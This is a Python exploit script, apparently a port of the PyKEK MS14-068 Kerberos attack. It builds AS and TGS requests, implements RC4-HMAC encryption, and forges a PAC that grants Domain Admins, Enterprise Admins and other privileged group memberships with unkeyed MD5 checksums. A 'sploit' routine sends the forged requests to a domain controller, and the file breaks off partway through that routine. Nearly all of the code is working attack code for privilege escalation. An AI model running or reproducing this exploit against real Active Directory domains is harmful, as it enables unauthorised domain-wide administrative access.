#!/usr/bin/env python3


# All imports from all modules:

from __future__ import print_function

import sys
import os
import binascii
from random import getrandbits
from time import time, gmtime, strftime, strptime, localtime
from getpass import getpass
from getopt import getopt

from collections import namedtuple
import struct
from struct import pack, unpack, unpack_from


from socket import socket

from pyasn1.type.univ import Integer, Sequence, SequenceOf, OctetString, BitString, Boolean
from pyasn1.type.char import GeneralString
from pyasn1.type.useful import GeneralizedTime
from pyasn1.type.tag import Tag, tagClassContext, tagClassApplication, tagFormatSimple
from pyasn1.type.namedtype import NamedTypes, NamedType, OptionalNamedType
from pyasn1.codec.der.encoder import encode
from pyasn1.codec.der.decoder import decode

from random import getrandbits, sample

try:
    from Crypto.Cipher import ARC4
    from Crypto.Hash import HMAC, MD5, MD4
except ImportError:
    from _crypto import ARC4, MD5, MD4
    import hmac as HMAC


from calendar import timegm



# Global variables from all modules

CCacheCredential = namedtuple('CCacheCredential', 'client server key time is_skey tktflags addrs authdata ticket second_ticket')
CCacheKeyblock = namedtuple('CCacheKeyblock', 'keytype etype keyvalue')
CCacheTimes = namedtuple('CCacheTimes', 'authtime starttime endtime renew_till')
CCacheAddress = namedtuple('CCacheAddress', 'addrtype addrdata')
CCacheAuthdata = namedtuple('CCacheAuthdata', 'authtype authdata')
CCachePrincipal = namedtuple('CCachePrincipal', 'name_type realm components')

VERSION = 0x0504
DEFAULT_HEADER = bytes.fromhex('00010008ffffffff00000000')

PAC_LOGON_INFO = 1
PAC_SERVER_CHECKSUM = 6
PAC_PRIVSVR_CHECKSUM = 7
PAC_CLIENT_INFO = 10

PAC_TYPE_NAME = {
    PAC_LOGON_INFO: 'Logon information',
    PAC_SERVER_CHECKSUM: 'Server checksum',
    PAC_PRIVSVR_CHECKSUM: 'KDC checksum',
    PAC_CLIENT_INFO: 'Client info'
}

SE_GROUP_MANDATORY = 1
SE_GROUP_ENABLED_BY_DEFAULT = 2
SE_GROUP_ENABLED = 4
SE_GROUP_ALL = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED

USER_NORMAL_ACCOUNT = 0x00000010
USER_DONT_EXPIRE_PASSWORD = 0x00000200

RC4_HMAC = 23

RSA_MD5 = 7
HMAC_MD5 = 0xFFFFFF76

NT_UNKNOWN = 0
NT_PRINCIPAL = 1
NT_SRV_INST = 2
NT_SRV_HST = 3
NT_SRV_XHST = 4
NT_UID = 5
NT_X500_PRINCIPAL = 6
NT_SMTP_NAME = 7
NT_ENTERPRISE = 10

AD_IF_RELEVANT = 1
AD_WIN2K_PAC = 128

# This corresponds to ccache module:

class CCache(object):
    def __init__(self, primary_principal, credentials=[], header=DEFAULT_HEADER):
        if not isinstance(primary_principal, CCachePrincipal):
            if isinstance(primary_principal, str) and '@' in primary_principal:
                realm, user_name = primary_principal.split('@', 1)
            elif isinstance(primary_principal, tuple) and len(primary_principal) == 2:
                realm, user_name = primary_principal
            else:
                raise ValueError(f'Bad primary principal format: {primary_principal!r}')
            primary_principal = CCachePrincipal(NT_PRINCIPAL, realm, [user_name])

        self.primary_principal = primary_principal
        self.credentials = credentials
        self.header = header

    @classmethod
    def load(cls, filename):
        with open(filename, 'rb') as fp:
            version, headerlen = unpack('>HH', fp.read(4))
            if version != VERSION:
                raise ValueError(f'Unsupported version: 0x{version:04x}')
            header = fp.read(headerlen)
            primary_principal = cls.read_principal(fp)
            credentials = []
            while True:
                try:
                    credentials.append(cls.read_credential(fp))
                except struct.error:
                    break
        return cls(primary_principal, credentials, header)

    def save(self, filename):
        with open(filename, 'wb') as fp:
            fp.write(pack('>HH', VERSION, len(self.header)))
            fp.write(self.header)
            self.write_principal(fp, self.primary_principal)
            for cred in self.credentials:
                self.write_credential(fp, cred)

    def add_credential(self, newcred):
        for i in range(len(self.credentials)):
            if self.credentials[i].client == newcred.client and self.credentials[i].server == newcred.server:
                self.credentials[i] = newcred
                return
        self.credentials.append(newcred)

    @classmethod
    def read_string(cls, fp):
        length = unpack('>I', fp.read(4))[0]
        return fp.read(length)

    @classmethod
    def write_string(cls, fp, s):
        fp.write(pack('>I', len(s)))
        fp.write(s)

    @classmethod
    def read_principal(cls, fp):
        name_type, num_components = unpack('>II', fp.read(8))
        realm = cls.read_string(fp)
        components = [cls.read_string(fp) for _ in range(num_components)]
        return CCachePrincipal(name_type, realm, components)
    
    @classmethod
    def write_principal(cls, fp, p):
        fp.write(pack('>II', p.name_type, len(p.components)))
        cls.write_string(fp, p.realm if isinstance(p.realm, bytes) else p.realm.encode('utf-8'))
        for comp in p.components:
            cls.write_string(fp, comp if isinstance(comp, bytes) else comp.encode('utf-8'))


    @classmethod
    def read_keyblock(cls, fp):
        keytype, etype, keylen = unpack('>HHH', fp.read(6))
        keyvalue = fp.read(keylen)
        return CCacheKeyblock(keytype, etype, keyvalue)

    @classmethod
    def write_keyblock(cls, fp, k):
        fp.write(pack('>HHH', k.keytype, k.etype, len(k.keyvalue)))
        fp.write(k.keyvalue)

    @classmethod
    def read_times(cls, fp):
        authtime, starttime, endtime, renew_till = unpack('>IIII', fp.read(16))
        return CCacheTimes(authtime, starttime, endtime, renew_till)

    @classmethod
    def write_times(cls, fp, t):
        fp.write(pack('>IIII', t.authtime, t.starttime, t.endtime, t.renew_till))

    @classmethod
    def read_address(cls, fp):
        addrtype = unpack('>H', fp.read(2))[0]
        addrdata = cls.read_string(fp)
        return CCacheAddress(addrtype, addrdata)

    @classmethod
    def write_address(cls, fp, a):
        fp.write(pack('>H', a.addrtype))
        cls.write_string(fp, a.addrdata)

    @classmethod
    def read_authdata(cls, fp):
        authtype = unpack('>I', fp.read(4))[0]
        authdata = cls.read_string(fp)
        return CCacheAuthdata(authtype, authdata)

    @classmethod
    def write_authdata(cls, fp, a):
        fp.write(pack('>I', a.authtype))
        cls.write_string(fp, a.authdata)

    @classmethod
    def read_credential(cls, fp):
        client = cls.read_principal(fp)
        server = cls.read_principal(fp)
        key = cls.read_keyblock(fp)
        time = cls.read_times(fp)
        is_skey, tktflags, num_address = unpack('>BII', fp.read(9))
        addrs = [cls.read_address(fp) for _ in range(num_address)]
        num_authdata = unpack('>I', fp.read(4))[0]
        authdata = [cls.read_authdata(fp) for _ in range(num_authdata)]
        ticket = cls.read_string(fp)
        second_ticket = cls.read_string(fp)
        return CCacheCredential(client, server, key, time, is_skey, tktflags, addrs, authdata, ticket, second_ticket)

    @classmethod
    def write_credential(cls, fp, c):
        cls.write_principal(fp, c.client)
        cls.write_principal(fp, c.server)
        cls.write_keyblock(fp, c.key)
        cls.write_times(fp, c.time)
        fp.write(pack('>BII', c.is_skey, c.tktflags, len(c.addrs)))
        for addr in c.addrs:
            cls.write_address(fp, addr)
        fp.write(pack('>I', len(c.authdata)))
        for authdata in c.authdata:
            cls.write_authdata(fp, authdata)
        cls.write_string(fp, c.ticket)
        cls.write_string(fp, c.second_ticket)

def get_tgt_cred(ccache):
    for credential in ccache.credentials:
        if credential.server.components[0] == b'krbtgt':
            return credential
    raise ValueError('No TGT in CCache!')

def kdc_rep2ccache(kdc_rep, kdc_rep_enc):
    # Obtener el realm del cliente, asegurando que sea bytes
    crealm = kdc_rep['crealm']
    if isinstance(crealm, str):
        client_realm = crealm.encode('utf-8')
    else:
        client_realm = bytes(crealm)

    # Obtener componentes del cliente, convertir a bytes si es str
    client_components = [
        c.encode('utf-8') if isinstance(c, str) else bytes(c)
        for c in kdc_rep['cname']['name-string']
    ]

    # Obtener el realm del servidor, asegurando que sea bytes
    srealm = kdc_rep_enc['srealm']
    if isinstance(srealm, str):
        server_realm = srealm.encode('utf-8')
    else:
        server_realm = bytes(srealm)

    # Obtener componentes del servidor, convertir a bytes si es str
    server_components = [
        c.encode('utf-8') if isinstance(c, str) else bytes(c)
        for c in kdc_rep_enc['sname']['name-string']
    ]

    return CCacheCredential(
        client=CCachePrincipal(
            name_type=int(kdc_rep['cname']['name-type']),
            realm=client_realm,  # Aquí estaba crealm, debe ser realm
            components=client_components
        ),
        server=CCachePrincipal(
            name_type=int(kdc_rep_enc['sname']['name-type']),
            realm=server_realm,
            components=server_components
        ),
        key=CCacheKeyblock(
            keytype=int(kdc_rep_enc['key']['keytype']),
            etype=0,
            keyvalue=bytes(kdc_rep_enc['key']['keyvalue'])
        ),
        time=CCacheTimes(
            authtime=gt2epoch(str(kdc_rep_enc['authtime'])),
            starttime=gt2epoch(str(kdc_rep_enc['starttime'])),
            endtime=gt2epoch(str(kdc_rep_enc['endtime'])),
            renew_till=gt2epoch(str(kdc_rep_enc['renew-till']))
        ),
        is_skey=0,
        tktflags=bitstring2int(kdc_rep_enc['flags']),
        addrs=[],
        authdata=[],
        ticket=encode(kdc_rep['ticket'].clone(tagSet=Ticket.tagSet, cloneValueFlag=True)),
        second_ticket=b''
    )



# This corresponds to krb5 module:

def _c(n, t):
    return t.clone(tagSet=t.tagSet + Tag(tagClassContext, tagFormatSimple, n))

def _v(n, t):
    return t.clone(tagSet=t.tagSet + Tag(tagClassContext, tagFormatSimple, n), cloneValueFlag=True)

def application(n):
    return Sequence.tagSet + Tag(tagClassApplication, tagFormatSimple, n)

class Microseconds(Integer): pass

class KerberosString(GeneralString): pass

class Realm(KerberosString): pass

class PrincipalName(Sequence):
    componentType = NamedTypes(
        NamedType('name-type', _c(0, Integer())),
        NamedType('name-string', _c(1, SequenceOf(componentType=KerberosString()))))

class KerberosTime(GeneralizedTime): pass

class HostAddress(Sequence):
    componentType = NamedTypes(
        NamedType('addr-type', _c(0, Integer())),
        NamedType('address', _c(1, OctetString())))

class HostAddresses(SequenceOf):
    componentType = HostAddress()

class AuthorizationData(SequenceOf):
    componentType = Sequence(componentType=NamedTypes(
            NamedType('ad-type', _c(0, Integer())),
            NamedType('ad-data', _c(1, OctetString()))))

class PAData(Sequence):
    componentType = NamedTypes(
        NamedType('padata-type', _c(1, Integer())),
        NamedType('padata-value', _c(2, OctetString())))

class KerberosFlags(BitString): pass

class EncryptedData(Sequence):
    componentType = NamedTypes(
        NamedType('etype', _c(0, Integer())),
        OptionalNamedType('kvno', _c(1, Integer())),
        NamedType('cipher', _c(2, OctetString())))

class EncryptionKey(Sequence):
    componentType = NamedTypes(
        NamedType('keytype', _c(0, Integer())),
        NamedType('keyvalue', _c(1, OctetString())))    

class CheckSum(Sequence):
    componentType = NamedTypes(
        NamedType('cksumtype', _c(0, Integer())),
        NamedType('checksum', _c(1, OctetString())))

class Ticket(Sequence):
    tagSet = application(1)
    componentType = NamedTypes(
        NamedType('tkt-vno', _c(0, Integer())),
        NamedType('realm', _c(1, Realm())),
        NamedType('sname', _c(2, PrincipalName())),
        NamedType('enc-part', _c(3, EncryptedData())))

class APOptions(KerberosFlags): pass

class APReq(Sequence):
    tagSet = application(14)
    componentType = NamedTypes(
        NamedType('pvno', _c(0, Integer())),
        NamedType('msg-type', _c(1, Integer())),
        NamedType('ap-options', _c(2, APOptions())),
        NamedType('ticket', _c(3, Ticket())),
        NamedType('authenticator', _c(4, EncryptedData())))

class Authenticator(Sequence):
    tagSet = application(2)
    componentType = NamedTypes(
        NamedType('authenticator-vno', _c(0, Integer())),
        NamedType('crealm', _c(1, Realm())),
        NamedType('cname', _c(2, PrincipalName())),
        OptionalNamedType('cksum', _c(3, CheckSum())),
        NamedType('cusec', _c(4, Microseconds())),
        NamedType('ctime', _c(5, KerberosTime())),
        OptionalNamedType('subkey', _c(6, EncryptionKey())),
        OptionalNamedType('seq-number', _c(7, Integer())),
        OptionalNamedType('authorization-data', _c(8, AuthorizationData())))

class KDCOptions(KerberosFlags): pass

class KdcReqBody(Sequence):
    componentType = NamedTypes(
        NamedType('kdc-options', _c(0, KDCOptions())),
        OptionalNamedType('cname', _c(1, PrincipalName())),
        NamedType('realm', _c(2, Realm())),
        OptionalNamedType('sname', _c(3, PrincipalName())),
        OptionalNamedType('from', _c(4, KerberosTime())),
        NamedType('till', _c(5, KerberosTime())),
        OptionalNamedType('rtime', _c(6, KerberosTime())),
        NamedType('nonce', _c(7, Integer())),
        NamedType('etype', _c(8, SequenceOf(componentType=Integer()))),
        OptionalNamedType('addresses', _c(9, HostAddresses())),
        OptionalNamedType('enc-authorization-data', _c(10, EncryptedData())),
        OptionalNamedType('additional-tickets', _c(11, SequenceOf(componentType=Ticket()))))

class KdcReq(Sequence):
    componentType = NamedTypes(
        NamedType('pvno', _c(1, Integer())),
        NamedType('msg-type', _c(2, Integer())),
        NamedType('padata', _c(3, SequenceOf(componentType=PAData()))),
        NamedType('req-body', _c(4, KdcReqBody())))

class TicketFlags(KerberosFlags): pass

class AsReq(KdcReq):
    tagSet = application(10)

class TgsReq(KdcReq):
    tagSet = application(12)

class KdcRep(Sequence):
    componentType = NamedTypes(
        NamedType('pvno', _c(0, Integer())),
        NamedType('msg-type', _c(1, Integer())),
        OptionalNamedType('padata', _c(2, SequenceOf(componentType=PAData()))),
        NamedType('crealm', _c(3, Realm())),
        NamedType('cname', _c(4, PrincipalName())),
        NamedType('ticket', _c(5, Ticket())),
        NamedType('enc-part', _c(6, EncryptedData())))

class AsRep(KdcRep):
    tagSet = application(11)

class TgsRep(KdcRep):
    tagSet = application(13)

class LastReq(SequenceOf):
    componentType = Sequence(componentType=NamedTypes(
            NamedType('lr-type', _c(0, Integer())),
            NamedType('lr-value', _c(1, KerberosTime()))))

class PaEncTimestamp(EncryptedData): pass

class PaEncTsEnc(Sequence):
    componentType = NamedTypes(
        NamedType('patimestamp', _c(0, KerberosTime())),
        NamedType('pausec', _c(1, Microseconds())))

class EncKDCRepPart(Sequence):
    componentType = NamedTypes(
        NamedType('key', _c(0, EncryptionKey())),
        NamedType('last-req', _c(1, LastReq())),
        NamedType('nonce', _c(2, Integer())),
        OptionalNamedType('key-expiration', _c(3, KerberosTime())),
        NamedType('flags', _c(4, TicketFlags())),
        NamedType('authtime', _c(5, KerberosTime())),
        OptionalNamedType('starttime', _c(6, KerberosTime())),
        NamedType('endtime', _c(7, KerberosTime())),
        OptionalNamedType('renew-till', _c(8, KerberosTime())),
        NamedType('srealm', _c(9, Realm())),
        NamedType('sname', _c(10, PrincipalName())),
        OptionalNamedType('caddr', _c(11, HostAddresses())))

class EncASRepPart(EncKDCRepPart):
    tagSet = application(25)

class EncTGSRepPart(EncKDCRepPart):
    tagSet = application(26)

class TransitedEncoding(Sequence):
    componentType = NamedTypes(
        NamedType('tr-type', _c(0, Integer())),
        NamedType('contents', _c(1, OctetString())))

class EncTicketPart(Sequence):
    tagSet = application(3)
    componentType = NamedTypes(
        NamedType('flags', _c(0, TicketFlags())),
        NamedType('key', _c(1, EncryptionKey())),
        NamedType('crealm', _c(2, Realm())),
        NamedType('cname', _c(3, PrincipalName())),
        NamedType('transited', _c(4, TransitedEncoding())),
        NamedType('authtime', _c(5, KerberosTime())),
        OptionalNamedType('starttime', _c(6, KerberosTime())),
        NamedType('endtime', _c(7, KerberosTime())),
        OptionalNamedType('renew-till', _c(8, KerberosTime())),
        OptionalNamedType('caddr', _c(9, HostAddresses())),
        OptionalNamedType('authorization-data', _c(10, AuthorizationData())))

class KerbPaPacRequest(Sequence):
    componentType = NamedTypes(
        NamedType('include-pac', _c(0, Boolean())))

def build_req_body(realm, service, host, nonce, cname=None, authorization_data=None, etype=RC4_HMAC):
    req_body = KdcReqBody()

    # (Forwardable, Proxiable, Renewable, Canonicalize)
    req_body['kdc-options'] = "'01010000100000000000000000000000'B"

    if cname is not None:
        req_body['cname'] = None
        req_body['cname']
        req_body['cname']['name-type'] = NT_PRINCIPAL
        req_body['cname']['name-string'] = None
        req_body['cname']['name-string'][0] = cname

    req_body['realm'] = realm

    req_body['sname'] = None
    req_body['sname']['name-type'] = NT_PRINCIPAL
    req_body['sname']['name-string'] = None
    req_body['sname']['name-string'][0] = service
    req_body['sname']['name-string'][1] = host

    req_body['from'] = '19700101000000Z'
    req_body['till'] = '19700101000000Z'
    req_body['rtime'] = '19700101000000Z'
    req_body['nonce'] = nonce

    req_body['etype'] = None
    req_body['etype'][0] = etype

    if authorization_data is not None:
        req_body['enc-authorization-data'] = None
        req_body['enc-authorization-data']['etype'] = authorization_data[0]
        req_body['enc-authorization-data']['cipher'] = authorization_data[1]

    return req_body

def build_authenticator(realm, name, chksum, subkey, current_time, authorization_data=None):
    auth = Authenticator()

    auth['authenticator-vno'] = 5

    auth['crealm'] = realm

    auth['cname'] = None
    auth['cname']['name-type'] = NT_PRINCIPAL
    auth['cname']['name-string'] = None
    auth['cname']['name-string'][0] = name

    auth['cksum'] = None
    auth['cksum']['cksumtype'] = chksum[0]
    auth['cksum']['checksum'] = chksum[1]

    gt, ms = epoch2gt(current_time, microseconds=True)
    auth['cusec'] = ms
    auth['ctime'] = gt

    auth['subkey'] = None
    auth['subkey']['keytype'] = subkey[0]
    auth['subkey']['keyvalue'] = subkey[1]

    if authorization_data is not None:
        auth['authorization-data'] = _v(8, authorization_data)

    return auth

def build_ap_req(ticket, key, msg_type, authenticator):
    enc_auth = encrypt(key[0], key[1], msg_type, encode(authenticator))

    ap_req = APReq()
    ap_req['pvno'] = 5
    ap_req['msg-type'] = 14
    ap_req['ap-options'] = "'00000000000000000000000000000000'B"
    ap_req['ticket'] = _v(3, ticket)

    ap_req['authenticator'] = None
    ap_req['authenticator']['etype'] = key[0]
    ap_req['authenticator']['cipher'] = enc_auth

    return ap_req

def build_tgs_req(target_realm, target_service, target_host,
                  user_realm, user_name, tgt, session_key, subkey,
                  nonce, current_time, authorization_data=None, pac_request=None):

    if authorization_data is not None:
        ad1 = AuthorizationData()
        ad1[0] = None
        ad1[0]['ad-type'] = authorization_data[0]
        ad1[0]['ad-data'] = authorization_data[1]
        ad = AuthorizationData()
        ad[0] = None
        ad[0]['ad-type'] = AD_IF_RELEVANT
        ad[0]['ad-data'] = encode(ad1)
        enc_ad = (subkey[0], encrypt(subkey[0], subkey[1], 5, encode(ad)))
    else:
        ad = None
        enc_ad = None

    req_body = build_req_body(target_realm, target_service, target_host, nonce, authorization_data=enc_ad)
    chksum = (RSA_MD5, checksum(RSA_MD5, encode(req_body)))

    authenticator = build_authenticator(user_realm, user_name, chksum, subkey, current_time)#, ad)
    ap_req = build_ap_req(tgt, session_key, 7, authenticator)

    tgs_req = TgsReq()
    tgs_req['pvno'] = 5
    tgs_req['msg-type'] = 12

    tgs_req['padata'] = None
    tgs_req['padata'][0] = None
    tgs_req['padata'][0]['padata-type'] = 1
    tgs_req['padata'][0]['padata-value'] = encode(ap_req)

    if pac_request is not None:
        pa_pac_request = KerbPaPacRequest()
        pa_pac_request['include-pac'] = pac_request
        tgs_req['padata'][1] = None
        tgs_req['padata'][1]['padata-type'] = 128
        tgs_req['padata'][1]['padata-value'] = encode(pa_pac_request)

    tgs_req['req-body'] = _v(4, req_body)

    return tgs_req

def build_pa_enc_timestamp(current_time, key):
    gt, ms = epoch2gt(current_time, microseconds=True)
    pa_ts_enc = PaEncTsEnc()
    pa_ts_enc['patimestamp'] = gt
    pa_ts_enc['pausec'] = ms

    pa_ts = PaEncTimestamp()
    pa_ts['etype'] = key[0]
    pa_ts['cipher'] = encrypt(key[0], key[1], 1, encode(pa_ts_enc))

    return pa_ts

def build_as_req(target_realm, user_name, key, current_time, nonce, pac_request=None):
    req_body = build_req_body(target_realm, 'krbtgt', target_realm, nonce, cname=user_name)
    pa_ts = build_pa_enc_timestamp(current_time, key)

    as_req = AsReq()

    as_req['pvno'] = 5
    as_req['msg-type'] = 10

    as_req['padata'] = None
    as_req['padata'][0] = None
    as_req['padata'][0]['padata-type'] = 2
    as_req['padata'][0]['padata-value'] = encode(pa_ts)

    if pac_request is not None:
        pa_pac_request = KerbPaPacRequest()
        pa_pac_request['include-pac'] = pac_request
        as_req['padata'][1] = None
        as_req['padata'][1]['padata-type'] = 128
        as_req['padata'][1]['padata-value'] = encode(pa_pac_request)

    as_req['req-body'] = _v(4, req_body)

    return as_req

def send_req(req, kdc, port=88):
    data = encode(req)
    data = pack('>I', len(data)) + data
    sock = socket()
    sock.connect((kdc, port))
    sock.send(data)
    return sock

def recv_rep(sock):
    data = b''
    datalen = None
    while True:
        rep = sock.recv(8192)
        if not rep:
            sock.close()
            raise IOError('Connection error')
        data += rep
        if len(data) >= 4:
            if datalen is None:
                datalen = unpack('>I', data[:4])[0]
            if len(data) >= 4 + datalen:
                sock.close()
                return data[4:4 + datalen]


def _decrypt_rep(data, key, spec, enc_spec, msg_type):
    rep = decode(data, asn1Spec=spec)[0]
    rep_enc = bytes(rep['enc-part']['cipher'])
    rep_enc = decrypt(key[0], key[1], msg_type, rep_enc)
    rep_enc = decode(rep_enc, asn1Spec=enc_spec)[0]
    return rep, rep_enc

    

def decrypt_tgs_rep(data, key):
    return _decrypt_rep(data, key, TgsRep(), EncTGSRepPart(), 9) # assume subkey

def decrypt_as_rep(data, key):
    return _decrypt_rep(data, key, AsRep(), EncASRepPart(), 8)

def decrypt_ticket_enc_part(ticket, key):
    ticket_enc = bytes(ticket['enc-part']['cipher'])
    ticket_enc = decrypt(key[0], key[1], 2, ticket_enc)
    return decode(ticket_enc, asn1Spec=EncTicketPart())[0]

def iter_authorization_data(ad):
    if ad is None:
        return
    for block in ad:
        yield block
        if block['ad-type'] == AD_IF_RELEVANT:
            decoded_ad = decode(bytes(block['ad-data']), asn1Spec=AuthorizationData())[0]
            for subblock in iter_authorization_data(decoded_ad):
                yield subblock


# This corresponds to crypto module:

def random_bytes(n):
    return bytes(sample(range(256), n))

def decrypt(etype, key, msg_type, encrypted):
    if etype != RC4_HMAC:
        raise NotImplementedError('Only RC4-HMAC supported!')
    chksum = encrypted[:16]
    data = encrypted[16:]
    k1 = HMAC.new(key, pack('<I', msg_type)).digest()
    k3 = HMAC.new(k1, chksum).digest()
    data = ARC4.new(k3).decrypt(data)
    if HMAC.new(k1, data).digest() != chksum:
        raise ValueError('Decryption failed! (checksum error)')
    return data[8:]

def encrypt(etype, key, msg_type, data):
    if etype != RC4_HMAC:
        raise NotImplementedError('Only RC4-HMAC supported!')
    key = bytes(key) if not isinstance(key, (bytes, bytearray)) else key
    k1 = HMAC.new(key, pack('<I', msg_type)).digest()
    data = random_bytes(8) + data
    chksum = HMAC.new(k1, data).digest()
    k3 = HMAC.new(k1, chksum).digest()
    return chksum + ARC4.new(k3).encrypt(data)

def checksum(cksumtype, data, key=None):
    if cksumtype == RSA_MD5:
        return MD5.new(data).digest()
    elif cksumtype == HMAC_MD5:
        return HMAC.new(key, data).digest()
    else:
        raise NotImplementedError('Only MD5 supported!')

def generate_subkey(etype=RC4_HMAC):
    if etype != RC4_HMAC:
        raise NotImplementedError('Only RC4-HMAC supported!')
    key = random_bytes(16)
    return (etype, key)

def ntlm_hash(pwd):
    return MD4.new(pwd.encode('utf-16le'))


# This corresponds to the util module:

def gt2epoch(gt):
    return timegm(strptime(gt, '%Y%m%d%H%M%SZ'))

def epoch2gt(epoch=None, microseconds=False):
    if epoch is None:
        epoch = time()
    gt = strftime('%Y%m%d%H%M%SZ', gmtime(epoch))
    if microseconds:
        ms = int(epoch * 1000000) % 1000000
        return (gt, ms)
    return gt

def epoch2filetime(epoch=None):
    if epoch is None:
        epoch = time()
    return pack('Q', int((epoch + 11644473600) * 10000000))

def filetime2local(s):
    t = unpack('Q', s)[0]
    if t == 0x7fffffffffffffff:
        return 'NEVER'
    if t == 0:
        return 'NULL'
    secs = t / 10000000 - 11644473600
    digits = t % 10000000
    return "%s.%07d" % (strftime('%Y/%m/%d %H:%M:%S', localtime(secs)), digits)

def bitstring2int(bs):
    return sum(b << i for i, b in enumerate(reversed(bs)))



# This corresponds to the pack module:

def _build_unicode_string(buf, eid, s):
    buf.append(b'')
    buf[-1] += pack('QI', len(s), len(s))
    buf[-1] += s.encode('utf-16le')
    return pack('HHI', len(s) * 2, len(s) * 2, eid)


def _build_groups(buf, eid, groups):
    buf.append(b'')
    buf[-1] += pack('I', len(groups))
    for gr, attr in groups:
        buf[-1] += pack('II', gr, attr)
    return pack('I', eid)


def _build_sid(buf, eid, s):
    l = s.split('-')
    assert l[0] == 'S'
    l = [int(c) for c in l[1:]]
    buf.append(b'')
    buf[-1] += pack('IBB', len(l) - 2, l[0], len(l) - 2)
    buf[-1] += pack('>IH', l[1] >> 16, l[1] & 0xffff)
    for c in l[2:]:
        buf[-1] += pack('I', c)
    return pack('I', eid)


def _build_pac_logon_info(domain_sid, domain_name, user_id, user_name, logon_time):
    buf = [b'']
    buf[0] += pack('I', 0x20000)
    buf[0] += logon_time
    buf[0] += pack('Q', 0x7fffffffffffffff) * 2
    buf[0] += pack('Q', 0) * 2
    buf[0] += pack('Q', 0x7fffffffffffffff)
    buf[0] += _build_unicode_string(buf, 0x20004, user_name)
    buf[0] += _build_unicode_string(buf, 0x20008, '')
    buf[0] += _build_unicode_string(buf, 0x2000c, '')
    buf[0] += _build_unicode_string(buf, 0x20010, '')
    buf[0] += _build_unicode_string(buf, 0x20014, '')
    buf[0] += _build_unicode_string(buf, 0x20018, '')
    buf[0] += pack('H', 0) * 2
    buf[0] += pack('I', user_id)
    buf[0] += pack('I', 513)
    buf[0] += pack('I', 5)
    buf[0] += _build_groups(buf, 0x2001c, [(513, SE_GROUP_ALL),
                                          (512, SE_GROUP_ALL),
                                          (520, SE_GROUP_ALL),
                                          (518, SE_GROUP_ALL),
                                          (519, SE_GROUP_ALL)])
    buf[0] += pack('I', 0)
    buf[0] += pack('QQ', 0, 0)
    buf[0] += _build_unicode_string(buf, 0x20020, '')
    buf[0] += _build_unicode_string(buf, 0x20024, domain_name)
    buf[0] += _build_sid(buf, 0x20028, domain_sid)
    buf[0] += pack('Q', 0)
    buf[0] += pack('I', USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD)
    buf[0] += pack('I', 0)
    buf[0] += pack('Q', 0) * 2
    buf[0] += pack('I', 0) * 4
    buf[0] += pack('I', 0) * 3

    flattened = b''
    for s in buf:
        flattened += s
        flattened += b'' * ((len(s) + 3) // 4 * 4 - len(s))

    header = bytes.fromhex('01100800cccccccc')
    header += pack('II', len(flattened), 0)

    return header + flattened


def _build_pac_client_info(user_name, logon_time):
    buf = b''
    buf += logon_time
    buf += pack('H', len(user_name) * 2)
    buf += user_name.encode('utf-16le')
    return buf


def build_pac(user_realm, user_name, user_sid, logon_time, server_key=(RSA_MD5, None), kdc_key=(RSA_MD5, None)):
    logon_time = epoch2filetime(logon_time)
    domain_sid, user_id = user_sid.rsplit('-', 1)
    user_id = int(user_id)

    elements = [
        (PAC_LOGON_INFO, _build_pac_logon_info(domain_sid, user_realm, user_id, user_name, logon_time)),
        (PAC_CLIENT_INFO, _build_pac_client_info(user_name, logon_time)),
        (PAC_SERVER_CHECKSUM, pack('I', server_key[0]) + b'' * 16),
        (PAC_PRIVSVR_CHECKSUM, pack('I', kdc_key[0]) + b'' * 16)
    ]

    buf = b''
    buf += pack('I', len(elements))
    buf += pack('I', 0)

    offset = 8 + len(elements) * 16
    for ultype, data in elements:
        buf += pack('I', ultype)
        buf += pack('I', len(data))
        buf += pack('Q', offset)
        offset = (offset + len(data) + 7) // 8 * 8

    for ultype, data in elements:
        if ultype == PAC_SERVER_CHECKSUM:
            ch_offset1 = len(buf) + 4
        elif ultype == PAC_PRIVSVR_CHECKSUM:
            ch_offset2 = len(buf) + 4
        buf += data
        buf += b'' * ((len(data) + 7) // 8 * 8 - len(data))

    chksum1 = checksum(server_key[0], buf, server_key[1])
    chksum2 = checksum(kdc_key[0], chksum1, kdc_key[1])

    buf = buf[:ch_offset1] + chksum1 + buf[ch_offset1 + len(chksum1):ch_offset2] + chksum2 + buf[ch_offset2 + len(chksum2):]

    return buf

def pretty_print_pac(data):
    count, version = unpack('<II', data[:8])
    print(f'PAC has {count} elements, version {version}')

    for i in range(count):
        offset = 8 + i * 16
        ultype, size, loc = unpack('<IIQ', data[offset:offset+16])
        name = PAC_TYPE_NAME.get(ultype, f'unknown (type {ultype})')
        entry_data = data[loc:loc+size]
        print(f'- {name}: {size} bytes at offset {loc}')





# This corresponds to the main module:

def sploit(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b,
           target_realm, target_service, target_host,
           output_filename, krbtgt_a_key=None, trust_ab_key=None, target_key=None):

    sys.stderr.write(f'  [+] Building AS-REQ for {kdc_a}...')
    sys.stderr.flush()
    nonce = getrandbits(31)
    current_time = time()
    as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce, pac_request=False)
    sys.stderr.write(' Done!\n')

    sys.stderr.write(f'  [+] Sending AS-REQ to {kdc_a}...')
    sys.stderr.flush()
    sock = send_req(as_req, kdc_a)
    sys.stderr.write(' Done!\n')

    sys.stderr.write(f'  [+] Receiving AS-REP from {kdc_a}...')
    sys.stderr.flush()
    data = recv_rep(sock)
    sys.stderr.write(' Done!\n')

    sys.stderr.write(f'  [+] Parsing AS-REP from {kdc_a}...')
    sys.stderr.flush()
    as_rep, as_rep_enc = decrypt_as_rep(data, user_key)
    session_key = (int(as_rep_enc['key']['keytype']), as_rep_enc['key']['keyvalue'])
    logon_time = gt2epoch(str(as_rep_enc['authtime']))
    tgt_a = as_rep['ticket']
    sys.stderr.write(' Done!\n')

    if krbtgt_a_key is not None:
        print(as_rep.prettyPrint(), file=sys.stderr)
        print(as_rep_enc.prettyPrint(), file=sys.stderr)
        ticket_debug(tgt_a, krbtgt_a_key)

    sys.stderr.write(f'  [+] Building TGS-REQ for {kdc_a}...')
    sys.stderr.flush()
    subkey = generate_subkey()
    nonce = getrandbits(31)
    current_time = time()
    pac = (AD_WIN2K_PAC, build_pac(user_realm, user_name, user_sid, logon_time))
    tgs_req = build_tgs_req(user_realm, 'krbtgt', target_realm, user_realm, user_name,
                            tgt_a, session_key, subkey, nonce, current_time, pac, pac_request=False)
    sys.stderr.write(' Done!\n')

